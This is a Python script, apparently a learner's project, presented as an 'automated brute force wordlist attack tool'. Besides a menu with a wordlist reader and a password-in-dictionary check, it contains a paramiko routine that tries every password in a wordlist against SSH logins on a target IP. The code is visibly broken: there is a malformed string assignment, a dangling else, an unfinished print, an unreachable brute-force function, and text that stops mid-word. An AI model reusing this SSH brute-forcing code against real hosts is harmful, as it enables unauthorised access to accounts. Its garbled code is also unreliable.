# !/usr/bin/env python3
#
# script name:  automated brute force wordlist attack tool
# author:       ben_podawiltz
# revision:     8.16.21

##########################################
#
# Libraries:
import itertools
import time
import os
import paramiko, sys, socket

###########################################
#
global host, username, line, input_file
line = ""*" * 50 "
###########################################
#
# Functions:

def main_menu():
    print("[1.] Offensive - Dictionary Iterator")
    print("[2.] Defensive - Password Recongnized")
    print("[3.] Quit")

    user_input = input(
        "Welcome to Automated Brute Force Wordlist Attack Tool please select method above:")

    if user_input == "1":
        Iterate()
    elif user_input == "2":
        checkpass()
    elif user_input == "3":
        exit
    else:
        print("Error, make another selection")
        main_menu()

def Iterate():
    host = input("")
    FP = input("Enter[/Path/To/File]:")
    if os.path.exists(FP):
        f = open(FP, "r", encoding="ISO-8859-1")
    
        for line in f:
            time.sleep(1)
            word = line.strip()
            print(word)
        f .close()
    else:
        print("^" * 10 + "No file exists" + "^" * 10)



def checkpass():
    filePath = input("Enter a path to dictionary [/Path/To/File]:")
    passwrd = input("Enter a password to run against a dictionary: ")

    with open(filePath, encoding="ISO-8859-1") as WL:
        
        if passwrd in WL.read():
            print("^" * 10 + "Password Recongnized" + "^" * 10)
        elif passwrd not in WL:
            print("^" * 10 + "Password Not Found" + "^" * 10)
            WL.close()

def ssh_connect(hostName, userName, PassWord, int=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        ssh.connect(hostName, port=22, username=userName, password=PassWord)

    except paramiko.AuthenticationException:
        int = 1 
    except socket.error as e:
        int = 2
    ssh.close()
    return int
 
def brute_ssh():
        hostName = input("Enter IP address of target:")
        userName = input("Enter username:")
        FP = input("Enter dictionary file path locatation [Path/To/File]:")
        f = open(FP, "r", encoding="ISO-8859-1")
    
        for line in f:
            pword = line.strip()
            brute = ssh_connect(hostName,userName, pword)

            if brute == 0:
                print("Valid Login {Username: ")
        f .close()
            else:
                print("^" * 10 + "No file exists" + "^" * 10) 

      #  if os.path.exists(file) == False:
     #       print("^" * 10 + "The dictionary list is not located here" + "^" * 10)
      #      sys.exit(4)
    
       #elif KeyboardInterrupt:
      #     print("^" * 10 + "Script Interrupted - Closed" + "^" * 10)
    #    elif 


      #  try:
      
# Main:
main_menu()
#####################################################################

# Source(s): https://github.com/rietesh/Brute-forcer-in-python/blob/master/brute-forcer.py
# https://docs.python.org/3/library/itertools.html
# https://www.w3schools.com/python/python_ref_file.asp
# https://stackoverflow.com/questions/19699367/for-line-in-results-in-unicodedecodeerror-utf-8-codec-cant-decode-byte

# Enc